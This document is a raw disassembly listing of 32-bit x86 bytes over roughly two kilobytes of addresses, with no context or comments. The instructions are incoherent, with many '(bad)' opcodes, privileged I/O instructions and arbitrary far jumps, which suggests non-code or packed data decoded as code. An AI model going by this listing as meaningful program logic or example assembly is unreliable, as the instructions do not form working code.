  419939:	and    DWORD PTR [esp+eiz*4-0x115dc51d],edi
  419940:	mov    esi,0x5ab7560d
  419945:	ror    DWORD PTR [edi-0x5],1
  419948:	into   
  419949:	repnz inc eax
  41994b:	fadd   st(3),st
  41994d:	les    esp,FWORD PTR [edi+0x14]
  419950:	push   ecx
  419951:	je     0x4199a1
  419953:	and    esp,DWORD PTR [edx-0x6b06e69d]
  419959:	addr16 call 0x7cc94cc2
  41995f:	aaa    
  419960:	retf   
  419961:	pushf  
  419962:	or     edi,ebx
  419964:	adc    eax,0x42803273
  419969:	mov    ?,ebp
  41996b:	xchg   esi,eax
  41996c:	pushf  
  41996d:	jnp    0x41996d
  41996f:	cmp    eax,0x7a484afe
  419974:	in     eax,dx
  419975:	aam    0x8d
  419977:	fiadd  DWORD PTR [ebp-0x6a]
  41997a:	mov    edx,0xbe528737
  41997f:	and    bl,bh
  419981:	adc    esp,DWORD PTR [ebx+ecx*1]
  419984:	push   ebx
  419985:	(bad)  
  419986:	xchg   edi,eax
  419987:	rol    BYTE PTR [ebx],1
  419989:	cmp    eax,0xe9eb5b8e
  41998e:	loop   0x4199a8
  419990:	cmc    
  419991:	push   edx
  419992:	cmp    ebp,DWORD PTR [ebp-0x4c]
  419995:	jne    0x4199b4
  419997:	dec    edi
  419998:	out    dx,eax
  419999:	cli    
  41999a:	stc    
  41999b:	ret    
  41999c:	dec    edx
  41999d:	jb     0x419956
  41999f:	adc    al,0x16
  4199a1:	mov    ds:0xebce13c9,al
  4199a6:	test   eax,0x136c7577
  4199ab:	dec    esi
  4199ac:	sub    al,0x76
  4199ae:	cmp    al,0x11
  4199b0:	jge    0x4199a7
  4199b2:	(bad)  
  4199b3:	push   ebx
  4199b4:	scas   eax,DWORD PTR es:[edi]
  4199b5:	and    ah,dl
  4199b7:	gs xchg eax,edx
  4199ba:	iret   
  4199bb:	jb     0x41998c
  4199bd:	xor    ah,ch
  4199bf:	sbb    DWORD PTR [ecx],eax
  4199c1:	out    dx,al
  4199c2:	in     eax,0x12
  4199c4:	pop    ebp
  4199c5:	add    BYTE PTR [eax+edx*1+0x12],0xd9
  4199ca:	stos   DWORD PTR es:[edi],eax
  4199cb:	jns    0x4199f8
  4199cd:	or     bl,bl
  4199cf:	mov    BYTE PTR [ebp+edi*4-0xf],al
  4199d3:	add    DWORD PTR [esi-0x7be81461],ebx
  4199d9:	into   
  4199da:	xor    BYTE PTR [ecx-0x1],0x11
  4199de:	loope  0x4199bd
  4199e0:	imul   ebp,DWORD PTR [eax-0x3f],0xedbc36a0
  4199e7:	or     BYTE PTR [eax-0x5e88809a],dh
  4199ed:	push   eax
  4199ee:	inc    ecx
  4199ef:	mov    ebp,0x5aeb57ff
  4199f4:	push   eax
  4199f5:	iret   
  4199f6:	out    0xba,eax
  4199f8:	aas    
  4199f9:	sub    eax,0xd461beec
  4199fe:	add    eax,0x15381fd7
  419a03:	fs jmp 0x4199bb
  419a06:	adc    BYTE PTR [ecx],bl
  419a08:	sbb    DWORD PTR [ecx-0x59],ecx
  419a0b:	(bad)  
  419a0c:	int    0x9f
  419a0e:	test   eax,0x6cd05807
  419a13:	add    esi,DWORD PTR [esi]
  419a15:	ss sti 
  419a17:	es loopne 0x419a5b
  419a1a:	jns    0x419a10
  419a1c:	cwde   
  419a1d:	or     eax,0x4e6e65cf
  419a22:	call   0x2db0b0ae
  419a27:	cmp    BYTE PTR [edi+0x333e5e63],0x6f
  419a2e:	(bad)  
  419a2f:	into   
  419a30:	jg     0x419a7a
  419a32:	mov    eax,0x5b0b36f2
  419a37:	push   edi
  419a38:	pop    esp
  419a39:	sbb    eax,0xf1d86ba7
  419a3e:	mov    esp,0x4d1bbb13
  419a43:	les    eax,FWORD PTR [ecx+0x57]
  419a46:	jmp    0xa98e9a9e
  419a4b:	add    eax,ebx
  419a4d:	or     edi,DWORD PTR [ecx-0x3816c2fd]
  419a53:	xchg   ecx,eax
  419a54:	sub    ah,dh
  419a56:	outs   dx,DWORD PTR ds:[esi]
  419a57:	and    ebx,DWORD PTR [ecx-0x3ce27610]
  419a5d:	push   ss
  419a5e:	das    
  419a5f:	sub    dl,BYTE PTR [edi+0x3c]
  419a62:	int3   
  419a63:	push   edi
  419a64:	sub    dh,BYTE PTR [ecx]
  419a66:	push   ecx
  419a67:	loopne 0x419a1b
  419a69:	or     DWORD PTR [edx+0x465c7950],edi
  419a6f:	pop    ecx
  419a70:	btc    edx,esp
  419a73:	mov    edx,0xc4b6bf0
  419a78:	push   edx
  419a79:	jno    0x419a1f
  419a7b:	pop    ds
  419a7c:	je     0x419a78
  419a7e:	shl    DWORD PTR [ebp-0x69],cl
  419a81:	aad    0x42
  419a83:	adc    BYTE PTR [ecx],0x35
  419a86:	arpl   di,bx
  419a88:	popf   
  419a89:	push   esp
  419a8a:	aad    0xb1
  419a8c:	add    DWORD PTR [ecx],edi
  419a8e:	(bad)  
  419a8f:	push   0xffffffad
  419a91:	and    al,BYTE PTR [esp+ebx*2]
  419a94:	shr    DWORD PTR [ecx-0x20],0x5b
  419a98:	in     eax,0xa5
  419a9a:	stc    
  419a9b:	lock out dx,eax
  419a9d:	mov    cl,0x16
  419a9f:	outs   dx,BYTE PTR ds:[esi]
  419aa0:	xchg   edx,eax
  419aa1:	lods   al,BYTE PTR ds:[esi]
  419aa2:	push   ds
  419aa3:	retf   
  419aa4:	dec    ebx
  419aa5:	gs push 0xcc510499
  419aab:	ret    
  419aac:	in     al,dx
  419aad:	push   edx
  419aae:	jg     0x419ac6
  419ab0:	sbb    bh,BYTE PTR [eax-0x3fdac0ac]
  419ab6:	pop    es
  419ab7:	aaa    
  419ab8:	je     0x419a3e
  419aba:	add    esi,esp
  419abc:	mov    eax,0xeffad01a
  419ac1:	nop
  419ac2:	xchg   BYTE PTR [esi],ch
  419ac4:	xor    esi,0x3e5be5ab
  419aca:	je     0x419a77
  419acc:	aaa    
  419acd:	cdq    
  419ace:	sbb    eax,0xcb73d992
  419ad3:	mov    edx,0x8505d3e4
  419ad8:	mov    ecx,0x5742e997
  419add:	stos   BYTE PTR es:[edi],al
  419ade:	sbb    BYTE PTR [edi],dl
  419ae0:	shl    DWORD PTR ds:0x3f9ca1bf,0x61
  419ae7:	or     eax,0xdf724a86
  419aec:	jne    0x419b4a
  419aee:	jno    0x419abe
  419af0:	mul    DWORD PTR [eax-0xd287f83]
  419af6:	jbe    0x419b1e
  419af8:	call   0xdc00:0xeea6389a
  419aff:	push   ds
  419b00:	cwde   
  419b01:	cdq    
  419b02:	scas   eax,DWORD PTR es:[edi]
  419b03:	jg     0x419b04
  419b05:	pusha  
  419b06:	into   
  419b07:	outs   dx,BYTE PTR ds:[esi]
  419b08:	out    0xf4,al
  419b0a:	sar    DWORD PTR [edx-0x3d],cl
  419b0d:	sbb    eax,0x2574956c
  419b12:	sbb    edx,DWORD PTR [ecx+eax*2+0x6c]
  419b16:	cwde   
  419b17:	sub    al,0x21
  419b19:	imul   ecx,DWORD PTR [edx-0x40],0x53efb059
  419b20:	pop    esi
  419b21:	mov    edi,0x57438935
  419b26:	xor    DWORD PTR [edx-0x1b],ebx
  419b29:	or     eax,0x3f09eb8f
  419b2e:	mov    esp,0xc8ba1c96
  419b33:	and    BYTE PTR [ebx+0x1950971c],ch
  419b39:	pop    esp
  419b3a:	leave  
  419b3b:	(bad)  
  419b3c:	std    
  419b3d:	scas   eax,DWORD PTR es:[edi]
  419b3e:	xor    edi,DWORD PTR [esi+0x6d]
  419b41:	mov    dl,0x52
  419b43:	mov    ah,0xb4
  419b45:	xchg   edi,eax
  419b46:	and    BYTE PTR [edx],cl
  419b48:	stos   DWORD PTR es:[edi],eax
  419b49:	jns    0x419b9d
  419b4b:	mov    DWORD PTR [edx+0x7ff3df58],edx
  419b51:	dec    esi
  419b52:	jae    0x419b46
  419b54:	or     bh,BYTE PTR [edx-0x72]
  419b57:	imul   edx,DWORD PTR [esi],0xfffffffe
  419b5a:	int3   
  419b5b:	jo     0x419aea
  419b5d:	pop    edx
  419b5e:	jns    0x419b02
  419b60:	jmp    0x419b74
  419b62:	pop    ss
  419b63:	call   0xb7dd:0x88027b72
  419b6a:	xchg   esp,eax
  419b6b:	arpl   WORD PTR [ebx+ebp*1-0x277cc170],sp
  419b72:	fs popa 
  419b74:	int    0xc2
  419b76:	lock mov ds:0x240138f9,eax
  419b7c:	sbb    al,0x84
  419b7e:	mov    bl,0xfb
  419b80:	sti    
  419b81:	and    BYTE PTR [esi],cl
  419b83:	mov    esi,DWORD PTR [ecx+0x52]
  419b86:	not    BYTE PTR [esi+0x3d]
  419b89:	iret   
  419b8a:	or     eax,0x3af22e96
  419b8f:	xchg   DWORD PTR [edi-0x25ab4ee0],esp
  419b95:	sar    DWORD PTR [edx+0x54],0xba
  419b99:	xchg   BYTE PTR [ebp-0x624b8ed8],ah
  419b9f:	bound  esp,QWORD PTR [edx]
  419ba1:	das    
  419ba2:	xchg   edi,eax
  419ba3:	mov    eax,ds:0xa0e88fe5
  419ba8:	inc    ecx
  419ba9:	ficomp WORD PTR [esi-0x54]
  419bac:	ror    BYTE PTR [edx+0x11df7466],1
  419bb2:	sub    al,0x67
  419bb4:	mov    ebx,0x5fef1a31
  419bb9:	inc    edx
  419bba:	int    0xfa
  419bbc:	rcl    BYTE PTR ds:0xb28bf7db,0x90
  419bc3:	jmp    0xb34f:0x7c56aafd
  419bca:	lea    edi,[edi-0x1c0515bf]
  419bd0:	mov    eax,ds:0xef5b195e
  419bd5:	hlt    
  419bd6:	cmp    eax,0x1a5638a1
  419bdb:	push   ecx
  419bdc:	rol    BYTE PTR [esi],cl
  419bde:	xchg   edi,eax
  419bdf:	jb     0x419c33
  419be1:	or     dl,BYTE PTR [edi+0x65]
  419be4:	mov    dl,BYTE PTR [edx]
  419be6:	loopne 0x419b6b
  419be8:	popf   
  419be9:	cmc    
  419bea:	lods   eax,DWORD PTR ds:[esi]
  419beb:	sbb    al,0x6d
  419bed:	inc    edi
  419bee:	hlt    
  419bef:	clc    
  419bf0:	xor    DWORD PTR [ebx],ebp
  419bf2:	push   esp
  419bf3:	mov    WORD PTR [ebx],fs
  419bf5:	popa   
  419bf6:	sbb    ebp,DWORD PTR [ecx]
  419bf8:	sub    BYTE PTR [ecx],ah
  419bfa:	repnz sub DWORD PTR [edx],0x20c98ac7
  419c01:	sbb    ch,BYTE PTR [ebx-0xb95156]
  419c07:	fild   QWORD PTR [ecx-0x12]
  419c0a:	adc    DWORD PTR [edi],ebp
  419c0c:	aad    0x3d
  419c0e:	ins    DWORD PTR es:[edi],dx
  419c0f:	aas    
  419c10:	fdivr  st(6),st
  419c12:	adc    al,0xc5
  419c15:	mov    DWORD PTR [eax],edx
  419c17:	loopne 0x419b9b
  419c19:	jns    0x419bdc
  419c1b:	and    BYTE PTR [ecx+0x63],cl
  419c1e:	inc    eax
  419c1f:	pusha  
  419c20:	push   edi
  419c21:	ret    0x39bc
  419c24:	add    al,0xdf
  419c26:	pop    ecx
  419c27:	pop    ds
  419c28:	rcl    DWORD PTR [esi+0x27a84122],1
  419c2e:	mov    esi,0xc8b304a0
  419c33:	iret   
  419c34:	mov    bl,0xbb
  419c36:	sar    al,cl
  419c38:	loope  0x419c32
  419c3a:	fidivr WORD PTR [edx+0x688de3c0]
  419c40:	xchg   esi,eax
  419c41:	push   esi
  419c42:	dec    eax
  419c43:	mov    eax,ds:0x8cd14d55
  419c48:	pop    ebx
  419c49:	dec    ecx
  419c4a:	test   eax,0xe9d50ea2
  419c4f:	arpl   WORD PTR [edi+0x15],bx
  419c52:	lds    edi,FWORD PTR [esi+0x43]
  419c55:	retf   
  419c56:	and    al,0x7e
  419c58:	dec    ebp
  419c59:	mov    ds:0xc9707a86,al
  419c5e:	add    BYTE PTR [ebx],cl
  419c60:	mov    al,0x4c
  419c62:	js     0x419cc4
  419c64:	sub    DWORD PTR [ebp+0x2f02d6a6],edi
  419c6a:	(bad)  
  419c6b:	xlat   BYTE PTR ds:[ebx]
  419c6c:	add    cl,cl
  419c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c6f:	cli    
  419c70:	stc    
  419c71:	push   ebp
  419c72:	in     eax,dx
  419c73:	pop    eax
  419c74:	inc    ebp
  419c75:	mov    ebx,0x89ea9126
  419c7a:	and    cl,BYTE PTR ds:0xfae40ea5
  419c80:	xchg   ebx,eax
  419c81:	dec    ebx
  419c82:	dec    ecx
  419c83:	(bad)  
  419c84:	and    al,0x52
  419c86:	cmp    eax,0xa0d952ce
  419c8b:	mov    ds:0x1a671800,al
  419c90:	in     eax,dx
  419c91:	pusha  
  419c92:	std    
  419c93:	jno    0x419cc9
  419c95:	std    
  419c96:	xchg   esi,eax
  419c97:	lods   eax,DWORD PTR ds:[esi]
  419c98:	dec    ebp
  419c99:	repz sub DWORD PTR [edx],edi
  419c9c:	sub    eax,0x9299f084
  419ca1:	imul   edi,DWORD PTR [ebp-0x7cfa6dcd],0xffffffcb
  419ca8:	jbe    0x419c73
  419caa:	pop    edx
  419cab:	pusha  
  419cac:	cmc    
  419cad:	ins    DWORD PTR es:[edi],dx
  419cae:	dec    ebx
  419caf:	pushf  
  419cb0:	push   ebx
  419cb1:	mov    eax,ds:0x2a984c4a
  419cb6:	mov    ds:0xc9a3ec73,eax
  419cbb:	in     eax,dx
  419cbc:	inc    esp
  419cbd:	inc    eax
  419cbe:	mov    cl,0x9e
  419cc0:	push   ecx
  419cc1:	test   al,0x46
  419cc3:	push   esi
  419cc4:	sbb    BYTE PTR [ecx+0x5348709f],dl
  419cca:	(bad)  [ebx+0x43]
  419ccd:	pop    edi
  419cce:	mov    ch,0x1a
  419cd0:	xor    edi,DWORD PTR [edi+0x4a16dc74]
  419cd6:	loop   0x419c78
  419cd8:	and    edi,esp
  419cda:	and    DWORD PTR [edx+0x3e],edi
  419cdd:	fld    DWORD PTR [edi-0x24]
  419ce0:	in     eax,dx
  419ce1:	stc    
  419ce2:	jne    0x419cb9
  419ce4:	jbe    0x419cd5
  419ce6:	and    DWORD PTR [edx-0x10],edi
  419ce9:	xchg   esi,eax
  419cea:	shl    DWORD PTR [ecx],cl
  419cec:	lsl    ecx,WORD PTR [ebp-0x39]
  419cf0:	shl    BYTE PTR [edx-0x7ad50191],cl
  419cf6:	scas   al,BYTE PTR es:[edi]
  419cf7:	shl    ebp,1
  419cf9:	in     eax,0xb7
  419cfb:	jnp    0x419d70
  419cfd:	sub    DWORD PTR [eax+edi*8],0xfffffffc
  419d01:	(bad)  
  419d02:	stos   DWORD PTR es:[edi],eax
  419d03:	dec    edx
  419d04:	call   DWORD PTR [esi-0x7b1e4fea]
  419d0a:	loopne 0x419d30
  419d0c:	xchg   ebp,eax
  419d0d:	and    cl,bl
  419d0f:	fistp  DWORD PTR [ebx]
  419d11:	(bad)  
  419d12:	push   ecx
  419d13:	mov    dl,BYTE PTR [edi-0x13]
  419d16:	lods   al,BYTE PTR ds:[esi]
  419d17:	rcr    BYTE PTR [eax],0x33
  419d1a:	adc    eax,0xc3622422
  419d1f:	imul   eax,DWORD PTR [edi],0x90075d2
  419d25:	jg     0x419d5a
  419d27:	pushf  
  419d28:	inc    eax
  419d29:	mov    ah,0xca
  419d2b:	xchg   edx,eax
  419d2c:	mov    dl,BYTE PTR [ebp-0x2827c4d3]
  419d32:	push   ecx
  419d33:	jbe    0x419da1
  419d35:	cmc    
  419d36:	mov    eax,ds:0xbf23f69
  419d3b:	mov    al,ds:0xcd877a67
  419d40:	dec    edx
  419d41:	daa    
  419d42:	jno    0x419db5
  419d44:	dec    ebx
  419d45:	xor    al,BYTE PTR [eax-0x63510cce]
  419d4b:	out    dx,al
  419d4c:	add    ch,0x6d
  419d4f:	cdq    
  419d50:	and    al,0xc4
  419d52:	xlat   BYTE PTR ds:[ebx]
  419d53:	pusha  
  419d54:	jns    0x419cd9
  419d56:	adc    DWORD PTR [edx],edi
  419d58:	mov    edx,DWORD PTR [ebx]
  419d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d5b:	dec    eax
  419d5c:	pop    edx
  419d5d:	je     0x419db2
  419d5f:	inc    ecx
  419d60:	dec    eax
  419d61:	(bad)  
  419d63:	not    DWORD PTR [edx+0x673a8f74]
  419d69:	and    eax,0x7ba2997b
  419d6e:	lds    esi,FWORD PTR [ebx+0x51]
  419d71:	and    BYTE PTR [ecx-0x56217956],dh
  419d77:	ret    
  419d78:	call   0x357cdffe
  419d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d7e:	test   BYTE PTR ds:0x78885f91,bh
  419d84:	push   cs
  419d85:	mov    cl,BYTE PTR [eax+0x32572abc]
  419d8b:	or     BYTE PTR [esi-0x314aad40],bl
  419d91:	aas    
  419d92:	mov    BYTE PTR [ecx-0x56f41e4a],dh
  419d98:	rol    BYTE PTR [ecx],0x68
  419d9b:	dec    esi
  419d9c:	or     BYTE PTR [edi-0x273ada99],0x53
  419da3:	sbb    DWORD PTR [ebx+ebx*1+0x3635ed15],eax
  419daa:	imul   DWORD PTR [ecx+0x5a65cc0a]
  419db0:	aam    0xa2
  419db2:	cdq    
  419db3:	inc    ebp
  419db4:	adc    esi,DWORD PTR fs:[eax-0x1e88aaad]
  419dbb:	shl    DWORD PTR [edi-0x3066f027],0x56
  419dc2:	mov    ch,0xe9
  419dc4:	loope  0x419d69
  419dc6:	into   
  419dc7:	push   ecx
  419dc8:	in     eax,dx
  419dc9:	ins    DWORD PTR es:[edi],dx
  419dca:	ins    BYTE PTR es:[edi],dx
  419dcb:	xor    al,0xd7
  419dcd:	jle    0x419d72
  419dcf:	cli    
  419dd0:	push   esp
  419dd1:	das    
  419dd2:	sti    
  419dd3:	cwde   
  419dd4:	push   ebx
  419dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dd6:	push   es
  419dd7:	sbb    ebp,DWORD PTR [ebp+0xc5dc12f]
  419ddd:	jp     0x419db6
  419ddf:	les    esp,FWORD PTR [edx+0x62]
  419de2:	ss call 0x546:0xa5f412aa
  419dea:	fs pop ss
  419dec:	fcomp  QWORD PTR [edx+0x35fc0fcc]
  419df2:	data16 loop 0x419e54
  419df5:	add    al,BYTE PTR [eax-0x8]
  419df8:	mov    esp,0xf6f81571
  419dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dfe:	jg     0x419d8d
  419e00:	mov    edi,0x9ce5a44e
  419e05:	sub    al,0x8b
  419e07:	das    
  419e08:	inc    edx
  419e09:	imul   edi,DWORD PTR [ecx],0xffffffde
  419e0c:	mov    BYTE PTR [esi],0x98
  419e0f:	pop    esi
  419e10:	pop    edx
  419e11:	mov    esi,0x1599ff9f
  419e16:	xor    BYTE PTR [esp],bl
  419e19:	movq   QWORD PTR [edx+ebx*1+0x4f],mm7
  419e1e:	pop    ss
  419e1f:	shr    edi,1
  419e21:	adc    DWORD PTR [ecx+0x58b8ec9e],esi
  419e27:	(bad)  
  419e28:	push   esp
  419e29:	pop    ecx
  419e2a:	out    0x82,al
  419e2c:	adc    DWORD PTR [ebp+0x27063518],edx
  419e32:	mov    ds:0x7997d60e,eax
  419e37:	xor    al,0x39
  419e39:	das    
  419e3a:	xor    eax,ecx
  419e3c:	popa   
  419e3d:	sub    esp,DWORD PTR [ebx+0x36729619]
  419e43:	cmp    ch,BYTE PTR [edi-0x4f]
  419e46:	stos   DWORD PTR es:[edi],eax
  419e47:	pop    edx
  419e48:	imul   edi,DWORD PTR [eax],0xffffffe1
  419e4b:	shl    BYTE PTR [eiz*8-0xe2e5206],0x26
  419e53:	mov    ebx,0xa934529
  419e58:	aaa    
  419e59:	dec    esi
  419e5a:	xor    BYTE PTR [ecx+eax*2+0x47],al
  419e5e:	(bad)  
  419e5f:	js     0x419dfb
  419e61:	js     0x419e08
  419e63:	sub    ebx,DWORD PTR [edx+0xb140537]
  419e69:	ret    
  419e6a:	mov    dh,0x8
  419e6c:	leave  
  419e6d:	mov    ds:0xef1cf57a,al
  419e72:	sbb    eax,0x96d73030
  419e77:	or     eax,0x5a822961
  419e7c:	fidiv  DWORD PTR [edi+0x76]
  419e7f:	adc    eax,ebp
  419e81:	mov    eax,ds:0x76191010
  419e86:	and    eax,0x6d0cb2b1
  419e8b:	test   al,0xd8
  419e8d:	adc    ebp,0xffffffee
  419e90:	xchg   esi,eax
  419e91:	std    
  419e92:	test   eax,0xc0662899
  419e97:	jge    0x419ea2
  419e99:	add    al,0xa6
  419e9b:	mov    dh,0xe5
  419e9d:	mov    esp,0x39c848ac
  419ea2:	jmp    0x419f17
  419ea4:	in     al,dx
  419ea5:	aad    0x57
  419ea7:	or     DWORD PTR [edi+ebx*8],0x484eebca
  419eae:	iret   
  419eaf:	push   0x1bd40c68
  419eb4:	out    0x7b,eax
  419eb6:	xchg   esp,eax
  419eb7:	test   al,0x21
  419eb9:	add    DWORD PTR [ebp-0x4a0c1c45],0x5
  419ec0:	je     0x419f18
  419ec2:	lea    ebx,es:[eax+ebp*4+0x10143a33]
  419eca:	(bad)  [eax]
  419ecc:	int    0xc9
  419ece:	jae    0x419e5d
  419ed0:	into   
  419ed1:	(bad)  
  419ed2:	repz lea eax,[esi-0x5d]
  419ed6:	or     eax,0x479f51d0
  419edb:	fisttp WORD PTR [edi+0x64]
  419ede:	ds daa 
  419ee0:	int    0x64
  419ee2:	test   eax,0x22417e16
  419ee7:	jg     0x419f27
  419ee9:	dec    esi
  419eea:	pop    esi
  419eeb:	pop    eax
  419eec:	mov    edi,0x24a58dfe
  419ef1:	mul    BYTE PTR [ebx-0x53bce459]
  419ef7:	mov    WORD PTR [ebx-0x46d7c9d7],?
  419efd:	out    dx,eax
  419efe:	inc    ecx
  419eff:	shl    DWORD PTR [eax-0xcfa7ba],0xe6
  419f06:	inc    ebp
  419f07:	scas   eax,DWORD PTR es:[edi]
  419f08:	ror    DWORD PTR [ecx],cl
  419f0a:	leave  
  419f0b:	jb     0x419ead
  419f0d:	sub    ebp,DWORD PTR [edi+0x78]
  419f10:	push   ebx
  419f11:	push   esi
  419f12:	aaa    
  419f13:	(bad)  
  419f15:	and    DWORD PTR [eax],ebp
  419f17:	push   es
  419f18:	js     0x419eeb
  419f1a:	arpl   WORD PTR [ecx-0x15],cx
  419f1d:	bound  esp,QWORD PTR [esi-0x360dc6a6]
  419f23:	sbb    eax,0xad70f8a5
  419f28:	inc    edx
  419f29:	test   al,0x4e
  419f2b:	test   eax,0xd53e67a
  419f30:	(bad)  
  419f31:	scas   al,BYTE PTR es:[edi]
  419f32:	mul    BYTE PTR [ebx-0x3c]
  419f35:	pop    esi
  419f36:	dec    esp
  419f37:	jmp    0x6e6b:0xf2dd0db5
  419f3e:	cwde   
  419f3f:	jmp    FWORD PTR [ebp-0x4b]
  419f42:	retf   
  419f43:	sub    al,0xb2
  419f45:	and    eax,0x5cd82c07
  419f4a:	test   eax,0xd82ffd7b
  419f4f:	jae    0x419f17
  419f51:	sbb    esp,ebx
  419f53:	dec    eax
  419f54:	pop    edi
  419f55:	push   esi
  419f56:	cmp    al,ch
  419f58:	sub    al,0x13
  419f5a:	cmp    eax,0x826f1b26
  419f5f:	mov    al,ds:0xf582cbc4
  419f64:	adc    al,BYTE PTR [eax]
  419f66:	jbe    0x419f2d
  419f68:	jecxz  0x419f4d
  419f6a:	aas    
  419f6b:	jg     0x419fdc
  419f6d:	hlt    
  419f6e:	mov    ds:0x24d70fe0,eax
  419f73:	in     eax,dx
  419f74:	xchg   edi,edi
  419f76:	push   0x1d
  419f78:	jbe    0x419f9b
  419f7a:	xor    al,al
  419f7c:	mov    esi,0x49731aff
  419f81:	jo     0x41a002
  419f83:	xchg   edi,eax
  419f84:	aad    0xcd
  419f86:	mov    ah,0x92
  419f88:	pushf  
  419f89:	cld    
  419f8a:	fld    DWORD PTR [ebx-0x416b604c]
  419f90:	dec    edi
  419f91:	or     edx,0xffffffe2
  419f94:	add    al,0xae
  419f96:	mov    edi,0xa0db3da2
  419f9b:	fmul   st(2),st
  419f9d:	pop    esp
  419f9e:	xchg   BYTE PTR [eax-0x41],ch
  419fa1:	lock rol ecx,cl
  419fa4:	push   0x7e
  419fa6:	test   al,0x37
  419fa8:	dec    ebx
  419fa9:	mov    cl,0x1d
  419fab:	sbb    ebp,ebx
  419fad:	adc    dh,BYTE PTR [edi+0x23eb683]
  419fb3:	cmp    ebp,DWORD PTR [ecx]
  419fb5:	je     0x41a000
  419fb7:	rol    DWORD PTR [edx+0x346c0f6c],cl
  419fbd:	(bad)  cs:[esi]
  419fc0:	dec    eax
  419fc1:	iret   
  419fc2:	test   eax,0xbbb61213
  419fc7:	lea    esi,[ebx+edx*4-0x34]
  419fcb:	dec    ebp
  419fcc:	inc    ebx
  419fcd:	mov    ch,0xca
  419fcf:	xor    al,0x4f
  419fd1:	mov    ebx,DWORD PTR [eax-0x6]
  419fd4:	mov    al,0x1
  419fd6:	mov    ?,WORD PTR [eax*4-0x6828099f]
  419fdd:	push   cs
  419fde:	retf   
  419fdf:	xor    ch,dl
  419fe1:	sub    ah,BYTE PTR [edi]
  419fe3:	jns    0x41a051
  419fe5:	push   ebp
  419fe6:	add    cl,BYTE PTR [ecx-0x11eb41fa]
  419fec:	loopne 0x419fce
  419fee:	dec    eax
  419fef:	adc    al,0x2f
  419ff1:	xchg   edi,eax
  419ff2:	bound  ebp,QWORD PTR [edi+0x75]
  419ff5:	jno    0x41a038
  419ff7:	lahf   
  419ff8:	mov    es,WORD PTR [ebx]
  419ffa:	and    ch,BYTE PTR [ecx-0x3b29f9f7]
  41a000:	fidivr DWORD PTR [ebx]
  41a002:	hlt    
  41a003:	xchg   edx,eax
  41a004:	inc    edi
  41a005:	outs   dx,DWORD PTR ds:[esi]
  41a006:	pusha  
  41a007:	cmp    edx,DWORD PTR [edx]
  41a009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a00a:	sti    
  41a00b:	leave  
  41a00c:	shr    BYTE PTR [ecx+0x10ee7b32],0x51
  41a013:	ret    0x10c6
  41a016:	adc    eax,0x50dfffcf
  41a01b:	outs   dx,BYTE PTR ds:[esi]
  41a01c:	leave  
  41a01d:	arpl   cx,ax
  41a01f:	fcmovbe st,st(0)
  41a021:	xor    DWORD PTR ds:0xeb5bc14b,edx
  41a027:	xchg   edx,eax
  41a028:	out    0xb0,eax
  41a02a:	add    bl,cl
  41a02c:	out    0xee,al
  41a02e:	pop    ebx
  41a02f:	or     al,dl
  41a031:	aad    0x5f
  41a033:	out    dx,al
  41a034:	xor    al,0x14
  41a036:	mov    edi,0xfe71feaa
  41a03b:	mov    dl,0x5e
  41a03d:	ficomp WORD PTR [ecx+0x2b]
  41a040:	adc    ch,al
  41a042:	cmp    BYTE PTR [edi],ah
  41a044:	fist   DWORD PTR [ecx]
  41a046:	hlt    
  41a047:	enter  0x9b88,0x2a
  41a04b:	ss adc ebx,ebx
  41a04e:	inc    ecx
  41a04f:	ret    0xbd4b
  41a052:	xchg   edi,eax
  41a053:	pop    ds
  41a054:	out    dx,eax
  41a055:	aam    0xc3
  41a057:	add    DWORD PTR [edx+0x41],eax
  41a05a:	gs pop eax
  41a05c:	or     edi,ecx
  41a05e:	add    dh,BYTE PTR [edx+0x532320bf]
  41a064:	loop   0x41a078
  41a066:	jl     0x41a073
  41a068:	stos   DWORD PTR es:[edi],eax
  41a069:	es mov ebp,0x87f45371
  41a06f:	mov    dl,0xca
  41a071:	add    BYTE PTR [esi+0x3f],dh
  41a074:	push   0x1b
  41a076:	add    dh,BYTE PTR ds:0x8f37ca04
  41a07c:	push   edx
  41a07d:	dec    DWORD PTR [ebx+0x4b6807b6]
  41a083:	sub    eax,0x3225d885
  41a088:	in     al,dx
  41a089:	dec    ecx
  41a08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a08b:	fcmovnb st,st(5)
  41a08d:	cld    
  41a08e:	jae    0x41a060
  41a090:	test   DWORD PTR [ebx+0x7df84c5],esp
  41a096:	retf   0xecd5
  41a099:	clc    
  41a09a:	mov    dh,0xb
  41a09c:	test   edx,esp
  41a09e:	jne    0x41a0a2
  41a0a0:	xor    bh,BYTE PTR [ebx]
  41a0a2:	sub    BYTE PTR [esi-0x4a6bc21e],bl
  41a0a8:	jno    0x41a0d9
  41a0aa:	ins    DWORD PTR es:[edi],dx
  41a0ab:	in     al,dx
  41a0ac:	sub    eax,0xc22d739a
  41a0b1:	lods   eax,DWORD PTR ds:[esi]
  41a0b2:	or     DWORD PTR [edi-0x4adb8513],edi
  41a0b8:	mov    eax,ds:0x68d27b8e
  41a0bd:	int    0x82
  41a0bf:	lods   al,BYTE PTR ds:[esi]
  41a0c0:	xor    BYTE PTR [edi-0x5abfe621],0xc4
  41a0c7:	push   ebp
  41a0c8:	in     eax,0xa4
  41a0ca:	jmp    0x3e62:0xea25ed95
  41a0d1:	fs pop esp
  41a0d3:	hlt    
  41a0d4:	push   es
  41a0d5:	or     eax,0x6bb0c1ce
  41a0da:	les    edx,FWORD PTR [edi-0x1]
  41a0dd:	jmp    0x6687:0x7f34f516
  41a0e4:	mov    edx,0x6139c7d
  41a0e9:	retf   
  41a0ea:	addr16 ja 0x41a141
  41a0ed:	push   cs
  41a0ee:	or     al,BYTE PTR [ecx]
  41a0f0:	push   ds
  41a0f1:	pop    ebp
  41a0f2:	xchg   ah,bh
  41a0f4:	scas   eax,DWORD PTR es:[edi]
  41a0f5:	push   eax
  41a0f6:	cmp    DWORD PTR [eax+0x37],ecx
  41a0f9:	and    edi,DWORD PTR [edx]
  41a0fb:	xor    DWORD PTR [ecx-0xa2c392d],eax
  41a101:	sbb    BYTE PTR [eax-0x2a221026],cl
  41a107:	add    DWORD PTR [edi+0x33],edx
